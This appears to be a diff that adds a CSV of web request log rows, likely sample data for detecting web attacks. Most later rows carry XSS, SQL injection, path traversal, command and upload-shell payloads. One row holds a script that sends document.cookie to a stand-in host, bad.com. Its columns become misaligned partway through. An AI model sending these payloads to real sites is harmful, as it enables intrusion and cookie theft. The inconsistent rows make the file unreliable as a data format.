@@ -1,0 +1,47 @@
+IP,Method,URL,lenght,User-Agent,content-type,connection,content,cookie
+157.33.41.17,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+157.33.41.17,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+157.33.41.17,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+198.235.24.162,GET,/,2865,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",text/html,keep-alive,,
+152.59.60.43,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+152.59.60.43,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+152.59.59.1,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+152.59.60.43,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+152.59.59.1,GET,/backgrounds/bg9.jpg,4677,Dart/3.12 (dart:io),text/html,keep-alive,,
+8.8.8.8,GET,/search?q=<script>alert(document.cookie)</script>,text/html,keep-alive,1420,,session=abc12,Mozilla/5.0 (Windows NT 10.0; Win64)
+103.53.40.77,GET,/backgrounds/bg9.jpg,image/jpeg,keep-alive,4677,,,Dart/3.12 (dart:io)
+212.58.246.91,GET,/login?user=admin'%20OR%201=1--,text/html,close,512,,,python-requests/2.25.1
+114.114.114.114,GET,/download?file=../../../../etc/passwd,text/plain,close,2048,,,curl/7.68.0
+193.99.144.80,GET,/product?id=1%20UNION%20SELECT%20user,pass,text/html,keep-alive,1024,,,Mozilla/5.0 (Macintosh; Intel Mac OS X)
+177.10.15.20,GET,/profile?name=<img%20src=x%20onerror=alert(1)>,text/html,keep-alive,850,,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64)
+197.213.1.2,POST,/admin/upload,multipart/form-data,close,4096,file=shell.php,admin=true,sqlmap/1.6.1
+8.8.8.8,GET,/index.html,text/html,keep-alive,2048,,,Mozilla/5.0 (Windows NT 10.0; Win64)
+103.53.40.77,GET,/contact.php,text/html,keep-alive,1200,,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)
+212.58.246.91,GET,/api/v1/users?id=1';%20DROP%20TABLE%20users--,application/json,keep-alive,750,,,Mozilla/5.0 (Windows NT 10.0)
+114.114.114.114,POST,/cmd?exec=whoami,text/plain,close,150,,,Nmap Scripting Engine
+193.99.144.80,GET,/assets/css/style.css,text/css,keep-alive,3200,,,Mozilla/5.0 (Windows NT 10.0; Win64)
+177.10.15.20,GET,/.git/config,text/plain,close,500,,,DirBuster/1.0-RC1
+197.213.1.2,GET,/search?q=<svg/onload=alert(1)>,text/html,keep-alive,940,,,Mozilla/5.0 (Android 12; Mobile)
+45.33.32.156,GET,/wp-admin/admin-ajax.php?action=../../../../bin/bash,text/html,close,800,,,Mozilla/5.0 (Windows NT 10.0)
+192.168.1.1,GET,/search?q=<script>alert(1)</script>,text/html,keep-alive,500,,,Mozilla/5.0
+8.8.8.8,GET,/login.php?user=admin' OR '1'='1,text/html,close,120,,,sqlmap/1.6.1
+103.53.40.77,GET,/download.php?file=../../../../etc/passwd,text/plain,close,800,,,curl/7.81
+212.58.246.91,GET,/product?id=1 UNION SELECT username,password FROM users,text/html,keep-alive,1500,,,python-requests/2.28
+114.114.114.114,POST,/comment?text=<script>document.location='http://bad.com/?c='+document.cookie</script>,application/x-www-form-urlencoded,close,400,,,Mozilla/5.0
+193.99.144.80,GET,/assets/img/logo.jpg,image/jpeg,keep-alive,3000,,,Nmap Scripting Engine
+177.10.15.20,GET,/api/v1/config?dir=../.env,text/plain,close,200,,,Mozilla/5.0
+197.213.1.2,GET,/?q=' AND SLEEP(5)--,text/html,keep-alive,100,,,Mozilla/5.0
+45.33.32.156,GET,/vulnerable_endpoint?msg=<svg/onload=alert(1)>,text/html,close,450,,,Mozilla/5.0
+8.8.4.4,GET,/admin_dashboard.php,text/html,keep-alive,2500,,,DirBuster/1.0-RC1
+9.9.9.9,GET,/profile?id=5%20UNION%20ALL%20SELECT%20NULL,NULL--,text/html,keep-alive,300,,,sqlmap/1.6.1
+104.28.14.49,GET,/.git/config,text/plain,close,150,,,curl/7.81
+192.168.1.1,GET,/search?q=<script>alert(1)</script>,text/html,keep-alive,500,,,Mozilla/5.0
+8.8.8.8,GET,/login.php?user=admin' OR '1'='1,text/html,close,120,,,sqlmap/1.6.1
+103.53.40.77,GET,/download.php?file=../../../../etc/passwd,text/plain,close,800,,,curl/7.81
+212.58.246.91,GET,/product?id=1 UNION SELECT username,password FROM users,text/html,keep-alive,1500,,,python-requests/2.28
+114.114.114.114,POST,/comment?text=<script>document.location='http://bad.com/?c='+document.cookie</script>,application/x-www-form-urlencoded,close,400,,,Mozilla/5.0
+193.99.144.80,GET,/assets/img/logo.jpg,image/jpeg,keep-alive,3000,,,Nmap Scripting Engine
+177.10.15.20,GET,/api/v1/config?dir=../.env,text/plain,close,200,,,Mozilla/5.0
+197.213.1.2,GET,/?q=' AND SLEEP(5)--,text/html,keep-alive,100,,,Mozilla/5.0
+45.33.32.156,GET,/vulnerable_endpoint?msg=<svg/onload=alert(1)>,text/html,close,450,,,Mozilla/5.0
+8.8.4.4,GET,/admin_dashboard.php,text/html,keep-alive,2500,,,DirBuster/1.0-RC1
